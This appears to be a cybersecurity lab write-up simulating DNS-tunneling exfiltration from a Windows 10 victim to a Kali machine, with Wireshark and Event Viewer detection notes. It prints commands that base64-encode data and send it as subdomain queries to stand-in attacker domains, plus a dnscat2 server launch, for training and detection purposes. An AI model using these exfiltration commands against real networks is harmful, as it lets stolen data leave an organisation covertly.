# Scenario 4: DNS Tunneling - Data Exfiltration via Encoded DNS Subdomain Queries

## ✅Simulated Activity:
Simulated an attacker exfiltrating sensitive data through covert DNS queries — by encoding data inside DNS subdomains and sending them to a fake DNS server (Kali machine). This task emulated stealthy exfiltration where detection is difficult using traditional perimeter defenses.

---

## ✦ Lab Setup

**Attacker:** Kali Linux (DNS server using Wireshark & `dnscat2`)  
**Victim:** Windows 10 (DNS client)  
**Logs collected:** Wireshark, `dnscat2`, Windows Event Viewer  

- DNS server set to Kali IP in Windows network settings
- Network connection established between Windows & Kali

---

## Steps Performed

## ✦ Basic DNS Exfil (Only using Kali and Wireshark)
### Step 1: Encode Fake Data
```bash
echo "mysecretdata" | base64
```

### Step 2: Simulate DNS Query with Encoded Data
```bash
nslookup bXlzZWNyZXRkYXRhCg.fakehacker.com
```
Or
```bash
dig @8.8.8.8 bXlzZWNyZXRkYXRhCg.attackerdomain.com
```
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint04_dns_exfil_basic_simulation.png)
Packets captured
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint04_dns_exfil_basic_packets.png)
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint04_dns_exfil_basic_log.png)

---

## ✦ Real DNS Tunnel Simulation
### 1. Configured DNS Server in Windows:
- Set Kali’s IP (e.g., `192.168.1.40`) as the **Preferred DNS server** in Windows 10 via Control Panel → Network Settings

### 2. Launched dnscat2 DNS Server on Kali:
```bash
ruby ./dnscat2.rb
```
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint04_dns_tunneling_dnscat2_tool.png)

- Server started on UDP port 53
- Kali now actively listens for incoming DNS queries

### 3. Simulated Encoded Data Exfiltration from Windows:
Used PowerShell/CMD to simulate encoded subdomain query:
```powershell
nslookup bXlzZWNyZXRkYXRh.fake
```
> bXlzZWNyZXRkYXRh = base64 of “mysecretdata”
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint04_dns_tunnel_simulated.png)

## ✦ Logs and Observations
### In Wireshark (on Kali):
- DNS queries from Windows captured
- Queries had base64-encoded subdomains
- Protocol: DNS
- Source: Windows VM IP (192.168.1.42)
- Destination: Kali DNS IP (192.168.1.40)

Example Log:
```css
Standard query A bXlzZWNyZXRkYXRh.fake
```
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint04_dns_tunnel_connection_from_windows.png)
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint04_dns_tunneling_logs_wireshark.png)

### In Event Viewer logged while basic DNS Exfil simulation (on Windows):
- Event ID 22 (DNS Query Logged)
- Verified DNS resolution activity to fake domain

![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint04_dns_exfil_basic_sysmon_log.png)

> ✦ During simulation, DNS query packets were successfully captured in Wireshark.  
> ✦ However, certain queries (especially to the fake DNS server running on Kali) were not consistently logged in Windows Event Viewer under Event ID 22.  
> ✦ This reflects a real-world challenge: _DNS tunneling often evades endpoint-level logging due to limitations in Windows logging mechanisms when using non-standard or silent DNS servers._  
> ✦ **The test confirmed that packet capture is often a more reliable method to detect such exfiltration attempts.**

---

✅ Conclusion  
The task successfully demonstrated DNS-based data exfiltration using encoded subdomain queries. DNS tunneling was simulated using dnscat2, and logs were captured on both the attacker (Kali) and victim (Windows) systems.  
This technique highlights the need for:

- Deep DNS inspection
- Network segmentation
- DNS query logging
- Threat hunting with anomaly-based detection
